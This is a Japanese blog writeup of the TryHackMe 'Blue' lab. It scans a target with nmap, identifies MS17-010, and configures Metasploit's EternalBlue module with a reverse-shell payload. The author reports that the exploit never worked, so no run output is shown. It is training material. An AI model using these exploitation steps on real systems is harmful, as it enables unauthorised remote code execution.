---
title: "THM Blue Writeup"
date: 2023-10-01
tags: [writeup, ctf, tryhackme]
description: "公開されているSMBサービスをスキャンし、MS17-010 EternalBlueエクスプロイトを使ってTryHackMeのBlueルームで足がかりを得る。"
---

## Setup

このチャレンジを始めるには、まずtryhackmeのVPNサーバーに接続する必要があります。詳細については[Access](https://tryhackme.com/access)ページを確認してください。

サーバーへの接続にはopenvpnを使います。コマンドは以下の通りです:

```console
$ sudo openvpn --config NovusEdge.ovpn
```

## Enumeration

マシンが起動したら、まずはネットワークのスキャンから始めます: 

```console
$ sudo nmap -sS -vv MACHINE_IP
...
Initiating SYN Stealth Scan at 15:45
Scanning MACHINE_IP [1000 ports]
Discovered open port 135/tcp on MACHINE_IP
Discovered open port 3389/tcp on MACHINE_IP
Discovered open port 139/tcp on MACHINE_IP
...
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127

...
```

このシンプルなスキャンから、ルームの最初の質問の答えが分かります:

> How many ports are open with a port number under 1000?
> > 3

さらにポート`135`、`139`、`445`に対してサービススキャンを実行して、サービスのバージョンを確認してみましょう:

```console
$ nmap -sV -vv -p135,139,445 MACHINE_IP 
...

PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

...
```

特に面白いものはなし…さて、次の質問の答えは`Eternal Blue`エクスプロイトに対応するエクスプロイトコードになります。どうしてその結論に至ったのか？正直なところ、Tryhackmeでこのルームを見ると、Webページ上に堂々と表示されているからです: 

![](/assets/img/writeup_assets/blue/blue-room-top.png)

ちょっと検索してみれば、このエクスプロイトの別名がすぐに分かります:

![](/assets/img/writeup_assets/blue/eblue-search.png)

ということで、次の質問の答えが得られます:

> What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
> > MS17-010

## Gaining Access

列挙（Enumeration）フェーズで得た知識をもとに、与えられたマシンの攻略を試みてみましょう。

これにはmetasploitを使う方法と使わない方法の2通りがあります。今回はmetasploitを使って進めますが、metasploitを使わずに試すセクションも別途用意しようと思います。

`msfconsole`を立ち上げたら、利用可能なエクスプロイトを検索してみます:

```console
$ sudo msfconsole -q
msf6 > search eternal blue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution                 
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection                                                                                  
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

探しているのは最初の`exploit/windows/smb/ms17_010_eternalblue`です。これでこのセクションの最初の質問の答えが得られます:

> Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
> > exploit/windows/smb/ms17_010_eternalblue

選択したモジュールのオプションは以下のように確認できます:

```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.80.0.96       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

いくつかのオプションを設定する必要がありますが、最初にして最も重要なのが`RHOSTS`です:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS  MACHINE_IP 
RHOSTS => MACHINE_IP
```

これが2つ目の質問の答えです:

> Show options and set the one required value. What is the name of this value? (All caps for submission)
> > RHOSTS

次に、エクスプロイトのペイロードを設定します。ルームの指示通りに`windows/x64/shell/reverse_tcp`を使っていきます:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```


あとはエクスプロイトを実行して、魔法のような結果を待つだけです！
> うまく動かない場合は、VMを終了（terminate）してから再起動し、RHOSTSを更新したうえでこのエクスプロイトを再実行してみてください

```console
```

#### ええと、自分の環境ではエクスプロイトがまったく動かなかったので、動いたらこのWriteupを更新します。ではまた！


ルームへのリンク: https://tryhackme.com/room/blue

